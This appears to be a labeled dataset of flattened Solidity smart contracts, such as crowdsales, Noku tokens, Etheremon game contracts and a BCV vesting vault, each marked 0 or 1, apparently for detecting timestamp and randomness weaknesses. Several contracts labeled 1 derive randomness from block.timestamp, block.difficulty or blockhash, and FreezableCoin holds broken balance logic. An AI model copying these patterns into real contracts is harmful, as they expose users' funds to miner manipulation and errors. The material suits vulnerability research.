0<CODESPLIT>contract EDUToken is BurnableToken, KYCToken, ERC827Token {    using SafeMath for uint256;    string public constant name = "EDU Token";    string public constant symbol = "EDU";    uint8 public constant decimals = 18;    uint256 public constant INITIAL_SUPPLY = 48000000 * (10 ** uint256(decimals));    constructor(address _certifier) public KYCToken(_certifier) {        totalSupply_ = INITIAL_SUPPLY;        balances[msg.sender] = INITIAL_SUPPLY;        emit Transfer(0x0, msg.sender, INITIAL_SUPPLY);    }    function transfer(address _to, uint256 _value) public isKnownCustomer(msg.sender) returns (bool) {        return super.transfer(_to, _value);    }    function transferFrom(address _from, address _to, uint256 _value) public isKnownCustomer(_from) returns (bool) {        return super.transferFrom(_from, _to, _value);    }    function approve(address _spender, uint256 _value) public isKnownCustomer(_spender) returns (bool) {        return super.approve(_spender, _value);    }    function increaseApproval(address _spender, uint _addedValue) public isKnownCustomer(_spender) returns (bool success) {        return super.increaseApproval(_spender, _addedValue);    }    function decreaseApproval(address _spender, uint _subtractedValue) public isKnownCustomer(_spender) returns (bool success) {        return super.decreaseApproval(_spender, _subtractedValue);    }    function delayedTransferFrom(address _tokenWallet, address _to, uint256 _value) public onlyManager returns (bool) {        transferFrom(_tokenWallet, _to, _value);        kycPending[_to] = true;    }}
0<CODESPLIT>contract EDUCrowdsale is AllowanceCrowdsale, CappedCrowdsale, TimedCrowdsale, Ownable, Certifiable {    using SafeMath for uint256;    uint256 constant FIFTY_ETH = 50 * (10 ** 18);    uint256 constant HUNDRED_AND_FIFTY_ETH = 150 * (10 ** 18);    uint256 constant TWO_HUNDRED_AND_FIFTY_ETH = 250 * (10 ** 18);    uint256 constant TEN_ETH = 10 * (10 ** 18);    EDUToken public token;    event TokenWalletChanged(address indexed newTokenWallet);    event WalletChanged(address indexed newWallet);    constructor(        address _wallet,        EDUToken _token,        address _tokenWallet,        uint256 _cap,        uint256 _openingTime,        uint256 _closingTime,        address _certifier    ) public      Crowdsale(getCurrentRate(), _wallet, _token)      AllowanceCrowdsale(_tokenWallet)      CappedCrowdsale(_cap)      TimedCrowdsale(_openingTime, _closingTime)      Certifiable(_certifier)    {        token = _token;    }    function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {        if (certifier.certified(_beneficiary)) {            token.transferFrom(tokenWallet, _beneficiary, _tokenAmount);        } else {            token.delayedTransferFrom(tokenWallet, _beneficiary, _tokenAmount);        }    }         function getCurrentRate() public view returns (uint256) {        if (block.timestamp < 1528156799) {                      return 1050;        } else if (block.timestamp < 1528718400) {               return 940;        } else if (block.timestamp < 1529323200) {               return 865;        } else if (block.timestamp < 1529928000) {               return 790;        } else {            return 750;        }    }         function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256)    {        uint256 currentRate = getCurrentRate();        uint256 volumeBonus = _getVolumeBonus(currentRate, _weiAmount);        return currentRate.mul(_weiAmount).add(volumeBonus);    }    function _getVolumeBonus(uint256 _currentRate, uint256 _weiAmount) internal view returns (uint256) {        if (_weiAmount >= TEN_ETH) {            return _currentRate.mul(_weiAmount).mul(20).div(100);        }        return 0;    }    function changeTokenWallet(address _tokenWallet) external onlyOwner {        require(_tokenWallet != address(0x0));        tokenWallet = _tokenWallet;        emit TokenWalletChanged(_tokenWallet);    }    function changeWallet(address _wallet) external onlyOwner {        require(_wallet != address(0x0));        wallet = _wallet;        emit WalletChanged(_wallet);    }}
0<CODESPLIT>contract NokuCustomToken is Ownable {    event LogBurnFinished();    event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);         NokuPricingPlan public pricingPlan;         address public serviceProvider;         bool public burningFinished;         modifier onlyServiceProvider() {        require(msg.sender == serviceProvider, "caller is not service provider");        _;    }    modifier canBurn() {        require(!burningFinished, "burning finished");        _;    }    constructor(address _pricingPlan, address _serviceProvider) internal {        require(_pricingPlan != 0, "_pricingPlan is zero");        require(_serviceProvider != 0, "_serviceProvider is zero");        pricingPlan = NokuPricingPlan(_pricingPlan);        serviceProvider = _serviceProvider;    }         function isCustomToken() public pure returns(bool isCustom) {        return true;    }         function finishBurning() public onlyOwner canBurn returns(bool finished) {        burningFinished = true;        emit LogBurnFinished();        return true;    }         function setPricingPlan(address _pricingPlan) public onlyServiceProvider {        require(_pricingPlan != 0, "_pricingPlan is 0");        require(_pricingPlan != address(pricingPlan), "_pricingPlan == pricingPlan");        pricingPlan = NokuPricingPlan(_pricingPlan);        emit LogPricingPlanChanged(msg.sender, _pricingPlan);    }}  
0<CODESPLIT>contract NokuCustomERC20 is NokuCustomToken, DetailedERC20, MintableToken, BurnableToken {    using SafeMath for uint256;    event LogNokuCustomERC20Created(        address indexed caller,        string indexed name,        string indexed symbol,        uint8 decimals,        uint256 transferableFromBlock,        uint256 lockEndBlock,        address pricingPlan,        address serviceProvider    );    event LogMintingFeeEnabledChanged(address indexed caller, bool indexed mintingFeeEnabled);    event LogInformationChanged(address indexed caller, string name, string symbol);    event LogTransferFeePaymentFinished(address indexed caller);    event LogTransferFeePercentageChanged(address indexed caller, uint256 indexed transferFeePercentage);         bool public mintingFeeEnabled;         uint256 public transferableFromBlock;         uint256 public lockEndBlock;         mapping (address => uint256) public initiallyLockedBalanceOf;         uint256 public transferFeePercentage;         bool public transferFeePaymentFinished;         TokenTimelock public timelock;         TokenVesting public vesting;    bytes32 public constant BURN_SERVICE_NAME     = "NokuCustomERC20.burn";    bytes32 public constant MINT_SERVICE_NAME     = "NokuCustomERC20.mint";    bytes32 public constant TIMELOCK_SERVICE_NAME = "NokuCustomERC20.timelock";    bytes32 public constant VESTING_SERVICE_NAME  = "NokuCustomERC20.vesting";    modifier canTransfer(address _from, uint _value) {        require(block.number >= transferableFromBlock, "token not transferable");        if (block.number < lockEndBlock) {            uint256 locked = lockedBalanceOf(_from);            if (locked > 0) {                uint256 newBalance = balanceOf(_from).sub(_value);                require(newBalance >= locked, "_value exceeds locked amount");            }        }        _;    }    constructor(        string _name,        string _symbol,        uint8 _decimals,        uint256 _transferableFromBlock,        uint256 _lockEndBlock,        address _pricingPlan,        address _serviceProvider    )    NokuCustomToken(_pricingPlan, _serviceProvider)    DetailedERC20(_name, _symbol, _decimals) public    {        require(bytes(_name).length > 0, "_name is empty");        require(bytes(_symbol).length > 0, "_symbol is empty");        require(_lockEndBlock >= _transferableFromBlock, "_lockEndBlock lower than _transferableFromBlock");        transferableFromBlock = _transferableFromBlock;        lockEndBlock = _lockEndBlock;        mintingFeeEnabled = true;        emit LogNokuCustomERC20Created(            msg.sender,            _name,            _symbol,            _decimals,            _transferableFromBlock,            _lockEndBlock,            _pricingPlan,            _serviceProvider        );    }    function setMintingFeeEnabled(bool _mintingFeeEnabled) public onlyOwner returns(bool successful) {        require(_mintingFeeEnabled != mintingFeeEnabled, "_mintingFeeEnabled == mintingFeeEnabled");        mintingFeeEnabled = _mintingFeeEnabled;        emit LogMintingFeeEnabledChanged(msg.sender, _mintingFeeEnabled);        return true;    }         function setInformation(string _name, string _symbol) public onlyOwner returns(bool successful) {        require(bytes(_name).length > 0, "_name is empty");        require(bytes(_symbol).length > 0, "_symbol is empty");        name = _name;        symbol = _symbol;        emit LogInformationChanged(msg.sender, _name, _symbol);        return true;    }         function finishTransferFeePayment() public onlyOwner returns(bool finished) {        require(!transferFeePaymentFinished, "transfer fee finished");        transferFeePaymentFinished = true;        emit LogTransferFeePaymentFinished(msg.sender);        return true;    }         function setTransferFeePercentage(uint256 _transferFeePercentage) public onlyOwner {        require(0 <= _transferFeePercentage && _transferFeePercentage <= 100, "_transferFeePercentage not in [0, 100]");        require(_transferFeePercentage != transferFeePercentage, "_transferFeePercentage equal to current value");        transferFeePercentage = _transferFeePercentage;        emit LogTransferFeePercentageChanged(msg.sender, _transferFeePercentage);    }    function lockedBalanceOf(address _to) public view returns(uint256 locked) {        uint256 initiallyLocked = initiallyLockedBalanceOf[_to];        if (block.number >= lockEndBlock) return 0;        else if (block.number <= transferableFromBlock) return initiallyLocked;        uint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));        uint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);        return initiallyLocked.sub(released);    }         function transferFee(uint256 _value) public view returns(uint256 usageFee) {        return _value.mul(transferFeePercentage).div(100);    }         function freeTransfer() public view returns (bool isTransferFree) {        return transferFeePaymentFinished || transferFeePercentage == 0;    }         function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) public returns(bool transferred) {        if (freeTransfer()) {            return super.transfer(_to, _value);        }        else {            uint256 usageFee = transferFee(_value);            uint256 netValue = _value.sub(usageFee);            bool feeTransferred = super.transfer(owner, usageFee);            bool netValueTransferred = super.transfer(_to, netValue);            return feeTransferred && netValueTransferred;        }    }         function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) public returns(bool transferred) {        if (freeTransfer()) {            return super.transferFrom(_from, _to, _value);        }        else {            uint256 usageFee = transferFee(_value);            uint256 netValue = _value.sub(usageFee);            bool feeTransferred = super.transferFrom(_from, owner, usageFee);            bool netValueTransferred = super.transferFrom(_from, _to, netValue);            return feeTransferred && netValueTransferred;        }    }         function burn(uint256 _amount) public canBurn {        require(_amount > 0, "_amount is zero");        super.burn(_amount);        require(pricingPlan.payFee(BURN_SERVICE_NAME, _amount, msg.sender), "burn fee failed");    }         function mint(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {        require(_to != 0, "_to is zero");        require(_amount > 0, "_amount is zero");        super.mint(_to, _amount);        if (mintingFeeEnabled) {            require(pricingPlan.payFee(MINT_SERVICE_NAME, _amount, msg.sender), "mint fee failed");        }        return true;    }         function mintLocked(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {        initiallyLockedBalanceOf[_to] = initiallyLockedBalanceOf[_to].add(_amount);        return mint(_to, _amount);    }         function mintTimelocked(address _to, uint256 _amount, uint256 _releaseTime) public onlyOwner canMint    returns(bool minted)    {        require(timelock == address(0), "TokenTimelock already activated");        timelock = new TokenTimelock(this, _to, _releaseTime);        minted = mint(timelock, _amount);        require(pricingPlan.payFee(TIMELOCK_SERVICE_NAME, _amount, msg.sender), "timelock fee failed");    }         function mintVested(address _to, uint256 _amount, uint256 _startTime, uint256 _duration) public onlyOwner canMint    returns(bool minted)    {        require(vesting == address(0), "TokenVesting already activated");        vesting = new TokenVesting(_to, _startTime, 0, _duration, true);        minted = mint(vesting, _amount);        require(pricingPlan.payFee(VESTING_SERVICE_NAME, _amount, msg.sender), "vesting fee failed");    }         function releaseVested() public returns(bool released) {        require(vesting != address(0), "TokenVesting not activated");        vesting.release(this);        return true;    }         function revokeVested() public onlyOwner returns(bool revoked) {        require(vesting != address(0), "TokenVesting not activated");        vesting.revoke(this);        return true;    }}  library AddressUtils {     function isContract(address addr) internal view returns (bool) {    uint256 size;                                       assembly { size := extcodesize(addr) }    return size > 0;  }} 
0<CODESPLIT>contract NokuCustomService is Pausable {    using AddressUtils for address;    event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);         NokuPricingPlan public pricingPlan;    constructor(address _pricingPlan) internal {        require(_pricingPlan.isContract(), "_pricingPlan is not contract");        pricingPlan = NokuPricingPlan(_pricingPlan);    }    function setPricingPlan(address _pricingPlan) public onlyOwner {        require(_pricingPlan.isContract(), "_pricingPlan is not contract");        require(NokuPricingPlan(_pricingPlan) != pricingPlan, "_pricingPlan equal to current");                pricingPlan = NokuPricingPlan(_pricingPlan);        emit LogPricingPlanChanged(msg.sender, _pricingPlan);    }}  
0<CODESPLIT>contract NokuCustomERC20Service is NokuCustomService {    event LogNokuCustomERC20ServiceCreated(address caller, address indexed pricingPlan);    uint256 public constant CREATE_AMOUNT = 1 * 10**18;    uint8 public constant DECIMALS = 18;    bytes32 public constant CUSTOM_ERC20_CREATE_SERVICE_NAME = "NokuCustomERC20.create";    constructor(address _pricingPlan) NokuCustomService(_pricingPlan) public {        emit LogNokuCustomERC20ServiceCreated(msg.sender, _pricingPlan);    }         function createCustomToken(string _name, string _symbol, uint8  ) public returns(NokuCustomERC20 customToken) {        customToken = new NokuCustomERC20(            _name,            _symbol,            DECIMALS,            block.number,            block.number,            pricingPlan,            owner        );                 customToken.transferOwnership(msg.sender);        require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), "fee payment failed");    }    function createCustomToken(        string _name,        string _symbol,        uint8  ,        uint256 transferableFromBlock,        uint256 lockEndBlock    )    public returns(NokuCustomERC20 customToken)    {        customToken = new NokuCustomERC20(            _name,            _symbol,            DECIMALS,            transferableFromBlock,            lockEndBlock,            pricingPlan,            owner        );                 customToken.transferOwnership(msg.sender);        require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), "fee payment failed");    }}
0<CODESPLIT>contract EtheremonEnum {    enum ArrayType {        CLASS_TYPE,        STAT_STEP,        STAT_START,        STAT_BASE,        OBJ_SKILL    }}interface EtheremonTradeInterface {    function isOnTrading(uint64 _objId) constant external returns(bool);}
0<CODESPLIT>contract EtheremonDataBase is EtheremonEnum {    function getMonsterObj(uint64 _objId) constant public returns(uint64 objId, uint32 classId, address trainer, uint32 exp, uint32 createIndex, uint32 lastClaimIndex, uint createTime);    function getMonsterDexSize(address _trainer) constant public returns(uint);    function getElementInArrayType(ArrayType _type, uint64 _id, uint _index) constant public returns(uint8);        function addMonsterObj(uint32 _classId, address _trainer, string _name)  public returns(uint64);    function addElementToArrayType(ArrayType _type, uint64 _id, uint8 _value) public returns(uint);}interface EtheremonRankData {    function setPlayer(address _trainer, uint64 _a0, uint64 _a1, uint64 _a2, uint64 _s0, uint64 _s1, uint64 _s2) external returns(uint32 playerId);}
1<CODESPLIT>contract EtheremonRankBattle is BasicAccessControl, EtheremonEnum {    struct MonsterObjAcc {        uint64 monsterId;        uint32 classId;        address trainer;        string name;        uint32 exp;        uint32 createIndex;        uint32 lastClaimIndex;        uint createTime;    }             address public dataContract;    address public tradeContract;    address public rankDataContract;        uint32[3] public starterClasses;    uint public maxDexSize = 200;             modifier requireDataContract {        require(dataContract != address(0));        _;    }        modifier requireTradeContract {        require(tradeContract != address(0));        _;    }    modifier requireRankDataContract {        require(rankDataContract != address(0));        _;    }         event EventUpdateCastle(address indexed trainer, uint32 playerId);    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);        function EtheremonRankBattle(address _dataContract, address _tradeContract, address _rankDataContract) public {        dataContract = _dataContract;        tradeContract = _tradeContract;        rankDataContract = _rankDataContract;    }        function setContract(address _dataContract, address _tradeContract, address _rankDataContract) onlyModerators external {        dataContract = _dataContract;        tradeContract = _tradeContract;        rankDataContract = _rankDataContract;    }    function setStarterClass(uint _index, uint32 _classId) onlyModerators external {        starterClasses[_index] = _classId;    }        function quickSetStarterClasses() onlyModerators external {        starterClasses[0] = 25;        starterClasses[1] = 26;        starterClasses[2] = 27;    }        function setMaxDexSize(uint _value) onlyModerators external {        maxDexSize = _value;    }                  function getRandom(uint _seed) constant public returns(uint) {        return uint(keccak256(block.timestamp, block.difficulty)) ^ _seed;    }        function getValidClassId(uint64 _objId, address _owner) constant public returns(uint32) {        EtheremonDataBase data = EtheremonDataBase(dataContract);        MonsterObjAcc memory obj;        (obj.monsterId, obj.classId, obj.trainer, obj.exp, obj.createIndex, obj.lastClaimIndex, obj.createTime) = data.getMonsterObj(_objId);        if (obj.trainer != _owner || obj.classId == 21) return 0;        return obj.classId;    }        function hasValidParam(address _trainer, uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) constant public returns(bool) {        if (_a1 == 0 || _a2 == 0 || _a3 == 0)            return false;        if (_a1 == _a2 || _a1 == _a3 || _a1 == _s1 || _a1 == _s2 || _a1 == _s3)            return false;        if (_a2 == _a3 || _a2 == _s1 || _a2 == _s2 || _a2 == _s3)            return false;        if (_a3 == _s1 || _a3 == _s2 || _a3 == _s3)            return false;        if (_s1 > 0 && (_s1 == _s2 || _s1 == _s3))            return false;        if (_s2 > 0 && (_s2 == _s3))            return false;                uint32 classA1 = getValidClassId(_a1, _trainer);        uint32 classA2 = getValidClassId(_a2, _trainer);        uint32 classA3 = getValidClassId(_a3, _trainer);                if (classA1 == 0 || classA2 == 0 || classA3 == 0)            return false;        if (classA1 == classA2 || classA1 == classA3 || classA2 == classA3)            return false;        if (_s1 > 0 && getValidClassId(_s1, _trainer) == 0)            return false;        if (_s2 > 0 && getValidClassId(_s2, _trainer) == 0)            return false;        if (_s3 > 0 && getValidClassId(_s3, _trainer) == 0)            return false;        return true;    }        function setCastle(uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) isActive requireDataContract         requireTradeContract requireRankDataContract external {                if (!hasValidParam(msg.sender, _a1, _a2, _a3, _s1, _s2, _s3))            revert();                EtheremonTradeInterface trade = EtheremonTradeInterface(tradeContract);        if (trade.isOnTrading(_a1) || trade.isOnTrading(_a2) || trade.isOnTrading(_a3) ||             trade.isOnTrading(_s1) || trade.isOnTrading(_s2) || trade.isOnTrading(_s3))            revert();        EtheremonRankData rank = EtheremonRankData(rankDataContract);        uint32 playerId = rank.setPlayer(msg.sender, _a1, _a2, _a3, _s1, _s2, _s3);        EventUpdateCastle(msg.sender, playerId);    }        function catchStarters() isActive requireDataContract external {        EtheremonDataBase data = EtheremonDataBase(dataContract);                 if (data.getMonsterDexSize(msg.sender) > maxDexSize)            revert();                uint i = 0;        uint j = 0;        uint seed = 0;        uint64 objId = 0;        uint32 classId = 0;        uint8 value = 0;        for (i = 0; i < starterClasses.length; i+=1) {            classId = starterClasses[i];            seed = getRandom(uint(block.blockhash(block.number - i)));            objId = data.addMonsterObj(classId, msg.sender, "..name me...");            for (j = 0; j < 6; j += 1) {                seed = seed ^ (i + j);                value = uint8(seed % 32) + data.getElementInArrayType(ArrayType.STAT_START, uint64(classId), j);                data.addElementToArrayType(ArrayType.STAT_BASE, objId, value);            }                        Transfer(address(0), msg.sender, objId);        }     }}
1<CODESPLIT>contract bet_various_v2{  uint constant maxguess=1000000;  uint bettingprice = 0.01 ether;  bytes32 curhash = '';    uint stasticsarrayitems = 20;  function addguess(uint guess) payable {    require(msg.value == bettingprice);    uint divideby = maxguess/stasticsarrayitems;    curhash = sha256(block.timestamp, block.coinbase, block.difficulty, curhash);    return;  }}
0<CODESPLIT>contract Tokensale is MintedCrowdsale, TimedCrowdsale {    constructor(        uint256 _start,        uint256 _end,        uint256 _rate,        address _wallet,        MintableToken _token    )        public        Crowdsale(_rate, _wallet, _token)        TimedCrowdsale(_start, _end)    {    }}
1<CODESPLIT>contract SuperCountriesEth {    uint256 private potVersion = 1;    uint256 private timestampLimit = 1528108990;	function updateTimestampLimit() internal {		timestampLimit = block.timestamp + (604800) + (potVersion * (28800));		return;	}}
0<CODESPLIT>contract BCV is ERC20Interface {    uint256 public constant decimals = 8;    string public constant symbol = "BCV";    string public constant name = "BitCapitalVendorToken";    uint256 public _totalSupply = 120000000000000000; // total supply is 1.2 billion    address public owner;    mapping(address => uint256) private balances;    mapping(address => mapping (address => uint256)) private allowed;    mapping(address => bool) private approvedInvestorList;    mapping(address => uint256) private deposit;    uint256 public totalTokenSold = 0;    modifier onlyPayloadSize(uint size) {      if(msg.data.length < size + 4) {        revert();      }      _;    }    function BCV()        public {        owner = msg.sender;        balances[owner] = _totalSupply;    }    function totalSupply()        public        constant        returns (uint256) {        return _totalSupply;    }    function balanceOf(address _addr)        public        constant        returns (uint256) {        return balances[_addr];    }    function isApprovedInvestor(address _addr)        public        constant        returns (bool) {        return approvedInvestorList[_addr];    }    function getDeposit(address _addr)        public        constant        returns(uint256){        return deposit[_addr];    }    function transfer(address _to, uint256 _amount)        public        returns (bool) {        if ( (balances[msg.sender] >= _amount) &&             (_amount >= 0) &&             (balances[_to] + _amount > balances[_to]) ) {            balances[msg.sender] -= _amount;            balances[_to] += _amount;            Transfer(msg.sender, _to, _amount);            return true;        } else {            return false;        }    }    function transferFrom(        address _from,        address _to,        uint256 _amount    )    public    returns (bool success) {        if (balances[_from] >= _amount && _amount > 0 && allowed[_from][msg.sender] >= _amount) {            balances[_from] -= _amount;            allowed[_from][msg.sender] -= _amount;            balances[_to] += _amount;            Transfer(_from, _to, _amount);            return true;        } else {            return false;        }    }    function approve(address _spender, uint256 _amount)        public        returns (bool success) {        require((_amount == 0) || (allowed[msg.sender][_spender] == 0));        allowed[msg.sender][_spender] = _amount;        Approval(msg.sender, _spender, _amount);        return true;    }    function allowance(address _owner, address _spender)        public        constant        returns (uint256 remaining) {        return allowed[_owner][_spender];    }    function () public payable{        revert();    }}library SafeMath {  function mul(uint256 a, uint256 b) internal pure returns (uint256) {    if (a == 0) {      return 0;    }    uint256 c = a * b;    assert(c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a / b;    return c;  }  function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal pure returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
1<CODESPLIT>contract BCVTokenVault is Ownable {    using SafeMath for uint256;    address public teamReserveWallet = 0x7e5C65b899Fb7Cd0c959e5534489B454B7c6c3dF;    address public lifeReserveWallet = 0xaed0363f76e4b906ef818b0f3199c580b5b01a43;    address public finanReserveWallet = 0xd60A1D84835006499d5E6376Eb7CB9725643E25F;    address public econReserveWallet = 0x0C6e75e481cC6Ba8e32d6eF742768fc2273b1Bf0;    address public developReserveWallet = 0x11aC32f89e874488890E5444723A644248609C0b;    uint256 public teamReserveAllocation = 2.4 * (10 ** 8) * (10 ** 8);    uint256 public lifeReserveAllocation = 1.2 * (10 ** 8) * (10 ** 8);    uint256 public finanReserveAllocation = 1.2 * (10 ** 8) * (10 ** 8);    uint256 public econReserveAllocation = 1.2 * (10 ** 8) * (10 ** 8);    uint256 public developReserveAllocation = 1.2 * (10 ** 8) * (10 ** 8);    uint256 public totalAllocation = 7.2 * (10 ** 8) * (10 ** 8);    uint256 public teamReserveTimeLock = 1552060800; // 2019-3-9    uint256 public lifeReserveTimeLock = 1527782400;  // 2018-6-1    uint256 public finanReserveTimeLock = 1527782400;  // 2018-6-1    uint256 public econReserveTimeLock = 1527782400;  // 2018-6-1    uint256 public developReserveTimeLock = 1538236800;  // 2018-9-30    uint256 public teamVestingStages = 34;   // 3% each month; total 34 stages.    uint256 public lifeVestingStages = 5;  // 20% each month; total 5 stages.    uint256 public finanVestingStages = 5;  // 20% each month; total 5 stages.    uint256 public econVestingStages = 240;  // 1200000 each month for first six years and 200000 each month for next forteen years; total 240 stages.    mapping(address => uint256) public allocations;    mapping(address => uint256) public timeLocks;    mapping(address => uint256) public claimed;    uint256 public lockedAt = 0;    BCV public token;    event Allocated(address wallet, uint256 value);    event Distributed(address wallet, uint256 value);    event Locked(uint256 lockTime);    modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }    modifier onlyTeamReserve {        require(msg.sender == teamReserveWallet);        require(allocations[msg.sender] > 0);        require(allocations[msg.sender] > claimed[msg.sender]);        _;    }    modifier onlyTokenReserveLife {        require(msg.sender == lifeReserveWallet);        require(allocations[msg.sender] > 0);        require(allocations[msg.sender] > claimed[msg.sender]);        _;    }    modifier onlyTokenReserveFinance {        require(msg.sender == finanReserveWallet);        require(allocations[msg.sender] > 0);        require(allocations[msg.sender] > claimed[msg.sender]);        _;    }    modifier onlyTokenReserveEcon {        require(msg.sender == econReserveWallet);        require(allocations[msg.sender] > 0);        require(allocations[msg.sender] > claimed[msg.sender]);        _;    }    modifier onlyTokenReserveDevelop {        require(msg.sender == developReserveWallet);        require(allocations[msg.sender] > 0);        require(allocations[msg.sender] > claimed[msg.sender]);        _;    }    modifier notLocked {        require(lockedAt == 0);        _;    }    modifier locked {        require(lockedAt > 0);        _;    }    modifier notAllocated {        require(allocations[teamReserveWallet] == 0);        require(allocations[lifeReserveWallet] == 0);        require(allocations[finanReserveWallet] == 0);        require(allocations[econReserveWallet] == 0);        require(allocations[developReserveWallet] == 0);        _;    }    function BCVTokenVault(ERC20Interface _token) public {        owner = msg.sender;        token = BCV(_token);    }    function allocate() public notLocked notAllocated onlyOwner {        require(token.balanceOf(address(this)) == totalAllocation);        allocations[teamReserveWallet] = teamReserveAllocation;        allocations[lifeReserveWallet] = lifeReserveAllocation;        allocations[finanReserveWallet] = finanReserveAllocation;        allocations[econReserveWallet] = econReserveAllocation;        allocations[developReserveWallet] = developReserveAllocation;        Allocated(teamReserveWallet, teamReserveAllocation);        Allocated(lifeReserveWallet, lifeReserveAllocation);        Allocated(finanReserveWallet, finanReserveAllocation);        Allocated(econReserveWallet, econReserveAllocation);        Allocated(developReserveWallet, developReserveAllocation);        lock();    }    function lock() internal notLocked onlyOwner {        lockedAt = block.timestamp;        timeLocks[teamReserveWallet] = teamReserveTimeLock;        timeLocks[lifeReserveWallet] = lifeReserveTimeLock;        timeLocks[finanReserveWallet] = finanReserveTimeLock;        timeLocks[econReserveWallet] = econReserveTimeLock;        timeLocks[developReserveWallet] = developReserveTimeLock;        Locked(lockedAt);    }    function recoverFailedLock() external notLocked notAllocated onlyOwner {        require(token.transfer(owner, token.balanceOf(address(this))));    }    function getTotalBalance() public view returns (uint256 tokensCurrentlyInVault) {        return token.balanceOf(address(this));    }    function getLockedBalance() public view onlyReserveWallets returns (uint256 tokensLocked) {        return allocations[msg.sender].sub(claimed[msg.sender]);    }    function claimTeamReserve() onlyTeamReserve locked public {        address reserveWallet = msg.sender;        require(block.timestamp > timeLocks[reserveWallet]);        uint256 vestingStage = teamVestingStage();        uint256 totalUnlocked = vestingStage.mul(7.2 * (10 ** 6) * (10 ** 8));        if (vestingStage == 34) {          totalUnlocked = allocations[teamReserveWallet];        }        require(totalUnlocked <= allocations[teamReserveWallet]);        require(claimed[teamReserveWallet] < totalUnlocked);        uint256 payment = totalUnlocked.sub(claimed[teamReserveWallet]);        claimed[teamReserveWallet] = totalUnlocked;        require(token.transfer(teamReserveWallet, payment));        Distributed(teamReserveWallet, payment);    }    function teamVestingStage() public view onlyTeamReserve returns(uint256) {        uint256 nowTime = block.timestamp;        uint256 stage = (nowTime.sub(teamReserveTimeLock)).div(2592000);        if(stage > teamVestingStages) {            stage = teamVestingStages;        }        return stage;    }    function claimTokenReserveLife() onlyTokenReserveLife locked public {        address reserveWallet = msg.sender;        require(block.timestamp > timeLocks[reserveWallet]);        uint256 vestingStage = lifeVestingStage();        uint256 totalUnlocked = vestingStage.mul(2.4 * (10 ** 7) * (10 ** 8));        require(totalUnlocked <= allocations[lifeReserveWallet]);        require(claimed[lifeReserveWallet] < totalUnlocked);        uint256 payment = totalUnlocked.sub(claimed[lifeReserveWallet]);        claimed[lifeReserveWallet] = totalUnlocked;        require(token.transfer(reserveWallet, payment));        Distributed(reserveWallet, payment);    }    function lifeVestingStage() public view onlyTokenReserveLife returns(uint256) {        uint256 nowTime = block.timestamp;        uint256 stage = (nowTime.sub(lifeReserveTimeLock)).div(2592000);        if(stage > lifeVestingStages) {            stage = lifeVestingStages;        }        return stage;    }    function claimTokenReserveFinan() onlyTokenReserveFinance locked public {        address reserveWallet = msg.sender;        require(block.timestamp > timeLocks[reserveWallet]);        uint256 vestingStage = finanVestingStage();        uint256 totalUnlocked = vestingStage.mul(2.4 * (10 ** 7) * (10 ** 8));        require(totalUnlocked <= allocations[finanReserveWallet]);        require(claimed[finanReserveWallet] < totalUnlocked);        uint256 payment = totalUnlocked.sub(claimed[finanReserveWallet]);        claimed[finanReserveWallet] = totalUnlocked;        require(token.transfer(reserveWallet, payment));        Distributed(reserveWallet, payment);    }    function finanVestingStage() public view onlyTokenReserveFinance returns(uint256) {        uint256 nowTime = block.timestamp;        uint256 stage = (nowTime.sub(finanReserveTimeLock)).div(2592000);        if(stage > finanVestingStages) {            stage = finanVestingStages;        }        return stage;    }    function claimTokenReserveEcon() onlyTokenReserveEcon locked public {        address reserveWallet = msg.sender;        require(block.timestamp > timeLocks[reserveWallet]);        uint256 vestingStage = econVestingStage();        uint256 totalUnlocked;        if (vestingStage <= 72) {          totalUnlocked = vestingStage.mul(1200000 * (10 ** 8));        } else {        // For the next 14 years stages          totalUnlocked = ((vestingStage.sub(72)).mul(200000 * (10 ** 8))).add(86400000 * (10 ** 8));        }        require(totalUnlocked <= allocations[econReserveWallet]);        require(claimed[econReserveWallet] < totalUnlocked);        uint256 payment = totalUnlocked.sub(claimed[econReserveWallet]);        claimed[econReserveWallet] = totalUnlocked;        require(token.transfer(reserveWallet, payment));        Distributed(reserveWallet, payment);    }    function econVestingStage() public view onlyTokenReserveEcon returns(uint256) {        uint256 nowTime = block.timestamp;        uint256 stage = (nowTime.sub(timeLocks[econReserveWallet])).div(2592000);        if(stage > econVestingStages) {            stage = econVestingStages;        }        return stage;    }    function claimTokenReserveDevelop() onlyTokenReserveDevelop locked public {      address reserveWallet = msg.sender;      require(block.timestamp > timeLocks[reserveWallet]);      require(claimed[reserveWallet] == 0);      uint256 payment = allocations[reserveWallet];      claimed[reserveWallet] = payment;      require(token.transfer(reserveWallet, payment));      Distributed(reserveWallet, payment);    }    function canCollect() public view onlyReserveWallets returns(bool) {        return block.timestamp > timeLocks[msg.sender] && claimed[msg.sender] == 0;    }}
1<CODESPLIT>contract FreezableCoin {    struct FreezingNode {        uint end_stamp;        uint num_coins;    }    mapping(address => FreezingNode[]) internal c_freezing_list;    uint total_coins;    function validBalanceOf(address addr) constant public returns (uint) {        FreezingNode[] memory nodes = c_freezing_list[addr];        for (uint i = 0; i < nodes.length; ++i) {            if (nodes[i].end_stamp > block.timestamp) {                total_coins = total_coins - nodes[i].end_stamp;                return total_coins ;            }        }    }}
